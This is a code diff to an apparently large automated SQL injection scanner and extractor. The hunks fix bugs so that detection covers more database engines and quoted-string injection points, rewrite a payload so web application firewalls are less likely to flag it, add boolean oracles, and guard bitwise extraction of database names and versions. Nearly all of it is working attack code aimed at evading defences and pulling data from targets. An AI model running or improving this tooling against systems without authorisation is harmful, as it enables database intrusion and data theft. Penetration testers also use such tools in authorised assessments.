@@ -68331,7 +68331,10 @@ class ScannerV5(ScannerV4):
 
             LOG.debug(f"  bool [{label}] ts={ts_combined:.3f} fs={fs_combined:.3f} ={delta:.3f}")
 
-            if ts_combined > 0.70 and delta > 0.18:
+            # BUG-PCV-BOUNDARY-REJECT FIX: strict `>` rejects combined=0.700 exactly on
+            # the boundary; log shows genuine signals at exactly 0.700 being dropped.
+            # Use `>=` so the boundary case passes to StatisticalConfirmer for validation.
+            if ts_combined >= 0.70 and delta > 0.18:
                 # Statistical confirmation
                 confirmed, p_val, effect = await StatisticalConfirmer.confirm(
                     engine, cfg, method, url, data, data_fmt,
@@ -108795,7 +108798,13 @@ class TechniqueCascadeEngine:
             if _oracle_instab:
                 # Instability-triggered: keep narrow set; bypass boolean would FP
                 # on unstable pages where response bodies vary randomly.
-                _timing_capable = {"T", "S", "HQ", "TH", "BT", "E", "EH"}
+                # BUG-TIMING-ONLY-EH-INCLUSION FIX: The original set included "E" and "EH"
+                # (error-based techniques) in the TIMING_ONLY narrow set.  Error-based
+                # techniques depend on SQL error responses, not timing — running them in
+                # TIMING_ONLY mode is contradictory and causes them to fire (returning
+                # status=400/err=False) and clutter the log without contributing any signal.
+                # Removed "E" and "EH" from the instability-triggered narrow set.
+                _timing_capable = {"T", "S", "HQ", "TH", "BT"}
                 LOG.info("  [try_all] Oracle=TIMING_ONLY (instability)  narrow technique set")
             else:
                 # WAF-blocking-triggered: add WAF-bypass boolean categories so
@@ -108867,9 +108876,16 @@ class TechniqueCascadeEngine:
         if _forced:
             dbms_order = [_forced]   # --dbms: only that DBMS, all 21 techniques
         elif self.known_dbms and self.known_dbms in DBMS_PROBE_ORDER:
-            # Fingerprinted DBMS: test detected + Generic only (not all 18)
-            # This is the 10-15x speedup from early fingerprinting
-            dbms_order = [self.known_dbms]  # Generic removed from defaults
+            # BUG-DBMS-SCOPE-COLLAPSE FIX: The original code collapsed dbms_order to a
+            # single-element list whenever known_dbms was set — even from a single
+            # ambiguous SafeModeVerifier probe.  This meant only PostgreSQL (or whichever
+            # DBMS was fingerprinted) was ever tested, silently skipping MySQL, MSSQL,
+            # Oracle, SQLite and all their payloads.  Fix: put known_dbms FIRST (preserves
+            # the early-exit speedup when the fingerprint is correct) but append all
+            # remaining DBMSes so that the scanner still covers every DBMS if the first
+            # one produces no detection result.
+            _remaining = [d for d in DBMS_PROBE_ORDER if d != self.known_dbms]
+            dbms_order = [self.known_dbms] + _remaining
         else:
             dbms_order = list(DBMS_PROBE_ORDER)
 
@@ -109818,9 +109834,18 @@ class TechniqueCascadeEngine:
         # ── INJECTION CONTEXT ────────────────────────────────────────────────
         # CtxProber removed entirely — it consumed HTTP requests before every
         # technique and caused "flies fast" by burning through the gate budget.
-        # Use numeric (no-prefix) context only; most payloads already include
-        # their own comment terminators (-- -, #, etc.).
-        _ctx_list = [InjectionContext.numeric()]
+        # BUG-STRING-CTX-MISSING FIX: The original code only tried InjectionContext.numeric()
+        # here.  Any injection point inside a single-quoted string literal
+        # (e.g. WHERE name='INPUT') requires a leading single-quote prefix so the payload
+        # breaks out of the string — without it every template produces syntactically invalid
+        # SQL and all probes fail silently.  Add InjectionContext.single() so both numeric
+        # and single-quoted string injection contexts are covered for all techniques that
+        # route through _try_technique.  Header techniques (EH/BH/TH/UH) keep numeric only
+        # because they inject into HTTP header values (no SQL quote context needed).
+        if tech in ("EH", "BH", "TH", "UH"):
+            _ctx_list = [InjectionContext.numeric()]
+        else:
+            _ctx_list = [InjectionContext.numeric(), InjectionContext.single()]
 
         # BUG-FIX R6B: Requirement 6 — all CERTIFIED_PAYLOAD_DATABASE payloads must go
         # through ALL mutation layers. Previously _try_technique only applied the tamper
@@ -128506,7 +128531,10 @@ class MultiStrategyExtractor:
             #           gives the same response. The inline error oracle is non-functional for
             #           SQLite; just use the CASE form which is at least syntactically valid.
             if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
-                p = self._build_inline(f"1/(({cond})::int-1)=1")
+                # BUG-MSE-INLINE-WAF-FIX: original `1/(({cond})::int-1)=1` uses
+                # PostgreSQL-specific `::int` cast which WAFs flag; CASE WHEN is
+                # standard SQL and structurally identical to the Oracle/MSSQL branch.
+                p = self._build_inline(f"1/CASE WHEN ({cond}) THEN 0 ELSE 1 END=1")
             elif self.dbms == "Oracle":
                 # CASE WHEN gates the div-zero: true→0→1/0→ORA-01476, false→1→1/1→ok
                 p = self._build_inline(
@@ -129178,7 +129206,13 @@ class MultiStrategyExtractor:
         # sizes that differ by ≥50B, register a body-diff eval function as the FIRST oracle.
         # This guarantees that confirmed boolean injections have a working oracle in MSE
         # regardless of whether error/timing/OOB channels are available.
-        if getattr(self.det, 'technique', '') in ('B', 'BH', 'IN', 'BT', 'ST'):
+        # BUG-MSE-NO-BOOL-ORACLE-E-EH FIX: E/EH error-based detections were excluded from
+        # the boolean body-diff probe.  Many targets that respond to error injection ALSO
+        # have a body-size boolean signal (the server returns different content for WHERE
+        # 1=1 vs WHERE 1=2).  Including E/EH means two extra inline probes per scan; if
+        # no gap is found the code falls through harmlessly.  Omitting them means MSE
+        # skips the only reliable extraction oracle for WAF-blocked error channels.
+        if getattr(self.det, 'technique', '') in ('B', 'BH', 'IN', 'BT', 'ST', 'E', 'EH'):
             try:
                 _bbd_fp_t, _ = await self._timed(self._build_inline("1=1"))
                 await asyncio.sleep(0.3)
@@ -146292,28 +146326,41 @@ class NovelWAFBypassExtractor:
             if err_cal:
                 etype, true_sig, false_sig = err_cal[0], err_cal[1], err_cal[2]
                 _sig_type = err_cal[3] if len(err_cal) > 3 else "status"
-                print("[+] [Novel]  Error type '%s' viable: TRUE%s FALSE%s (%s)" % (etype, true_sig, false_sig, _sig_type))
+                # BUG-ERRTYPE-TRUE-FALSE-EQUAL FIX: calibrate() can return a result even
+                # when true_sig == false_sig — this happens when a WAF homogenises ALL
+                # responses to the same status/size regardless of SQL content.  With equal
+                # signals _errtype_eval() always returns True → all bits set to 1 for
+                # every character → non-BMP Unicode garbage (e.g. U+FE9C7, U+718CB as
+                # observed in the scan log).  The downstream sanity checks in
+                # _bitwise_extract_with_oracle catch this but waste up to 4200 HTTP
+                # requests first.  Guard here so we never enter the extraction loop when
+                # the oracle cannot distinguish True from False.
+                if true_sig == false_sig:
+                    print("[+] [Novel]  Error type '%s' calibrated TRUE=%s FALSE=%s "
+                          "— signals IDENTICAL; WAF homogenises responses; skipping" % (etype, true_sig, false_sig))
+                else:
+                    print("[+] [Novel]  Error type '%s' viable: TRUE%s FALSE%s (%s)" % (etype, true_sig, false_sig, _sig_type))
 
-                async def _errtype_eval(cond):
-                    payload = ConditionalErrorTypeOracle.build_conditional_error(cond, dbms, etype)
-                    fp, _ = await send_fn(payload)
-                    if _sig_type == "status":
-                        sig = getattr(fp, "status_code", 0)
-                    else:
-                        sig = getattr(fp, "content_length", 0)
-                    return sig == true_sig
+                    async def _errtype_eval(cond):
+                        payload = ConditionalErrorTypeOracle.build_conditional_error(cond, dbms, etype)
+                        fp, _ = await send_fn(payload)
+                        if _sig_type == "status":
+                            sig = getattr(fp, "status_code", 0)
+                        else:
+                            sig = getattr(fp, "content_length", 0)
+                        return sig == true_sig
 
-                for label, query in [("database", _db_q), ("version", _version_q)]:
-                    q = query.get(dbms, "SELECT 1")
-                    val = await asyncio.wait_for(
-                        _bitwise_extract_with_oracle(_errtype_eval, q, dbms, delay, label),
-                        timeout=120)
-                    if val:
-                        results[label] = val
-                        print("[+] [Novel]  Error-type %s = %s" % (label, val,))
-                    await asyncio.sleep(delay)
-                results = {k: v for k, v in results.items() if len(str(v)) >= 3}
-                if results: return results
+                    for label, query in [("database", _db_q), ("version", _version_q)]:
+                        q = query.get(dbms, "SELECT 1")
+                        val = await asyncio.wait_for(
+                            _bitwise_extract_with_oracle(_errtype_eval, q, dbms, delay, label),
+                            timeout=120)
+                        if val:
+                            results[label] = val
+                            print("[+] [Novel]  Error-type %s = %s" % (label, val,))
+                        await asyncio.sleep(delay)
+                    results = {k: v for k, v in results.items() if len(str(v)) >= 3}
+                    if results: return results
             else:
                 print("[+] [Novel]  No error type produces different response")
         except Exception as e:
@@ -162168,7 +162215,24 @@ class ErrorBasedExtractor:
             LOG.debug("[ErrorBasedExtractor] SQLite: skipping error-based extraction "
                       "(SQLite errors do not embed value — using blind oracle instead)")
             return None
-        templates = self.CAST_TEMPLATES.get(dbms, self.CAST_TEMPLATES.get("MySQL", []))
+        # BUG-ERREXT-FALLBACK-MYSQL FIX: Unknown DBMSes (CockroachDB, YugabyteDB,
+        # Amazon Redshift, Sybase…) previously fell back to MySQL templates.
+        # MySQL-specific EXTRACTVALUE/UPDATEXML are not defined in those engines and
+        # always fail; the extractor returned None after wasting N requests.
+        # Fix: map PostgreSQL-compatible wire-protocol DBMSes to PostgreSQL templates;
+        # return None for completely unknown DBMSes (blind paths handle extraction).
+        _pg_compat = {"CockroachDB", "YugabyteDB", "Amazon Redshift"}
+        _mysql_compat = {"MariaDB"}  # already has its own entry; guard for safety
+        if dbms in _pg_compat:
+            templates = self.CAST_TEMPLATES.get("PostgreSQL", [])
+        elif dbms in _mysql_compat:
+            templates = self.CAST_TEMPLATES.get("MySQL", [])
+        else:
+            templates = self.CAST_TEMPLATES.get(dbms, [])
+        if not templates:
+            LOG.debug("[ErrorBasedExtractor] %s: no CAST_TEMPLATES available — "
+                      "skipping error-based extraction", dbms)
+            return None
         
         # Try with tamper chain first, then raw
         _payloads = []
